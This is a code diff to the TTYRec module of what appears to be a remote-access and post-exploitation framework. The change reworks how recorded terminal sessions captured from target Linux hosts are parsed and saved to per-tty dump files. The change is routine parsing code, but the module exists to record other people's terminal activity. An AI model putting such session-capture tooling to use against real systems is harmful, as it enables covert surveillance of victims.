@@ -26,7 +26,7 @@ class TTYRec(PupyModule):
         'linux': ['ttyrec']
     }
 
-    header = struct.Struct('<16ssIIII')
+    header = struct.Struct('<8s16ssIIII')
 
     @classmethod
     def init_argparse(cls):
@@ -69,22 +69,26 @@ class TTYRec(PupyModule):
             if not header:
                 break
 
-            comm, probe, pid, sec, usec, lbuf = self.header.unpack(header)
-            comm = comm.strip('\0')
-            pid = int(pid)
+            tty, comm, probe, pid, sec, usec, lbuf = \
+                self.header.unpack(header)
+
+            comm = comm.strip().strip('\0')
+            tty = tty.strip()
+            filename = tty + '.' + probe + '.rec'
+
+            pid = str(pid)
             sec = int(sec)
             usec = int(usec)
             lbuf = int(lbuf)
-            key = frozenset([comm, probe, pid])
-            if key not in dests:
-                filename = '{}.{}.{}.rec'.format(comm, pid, probe)
+
+            if filename not in dests:
                 dest = os.path.join(dumpdir, filename)
-                self.info('{} {} -> {}'.format(comm, pid, dest))
-                dests[key] = open(dest, 'a')
+                self.info('{} -> {}'.format(tty, dest))
+                dests[filename] = open(dest, 'a')
 
             payload = data.read(lbuf)
-            dests[key].write(struct.pack('<III', sec, usec, lbuf))
-            dests[key].write(payload)
+            dests[filename].write(struct.pack('<III', sec, usec, lbuf))
+            dests[filename].write(payload)
 
         for f in dests.itervalues():
             f.close()
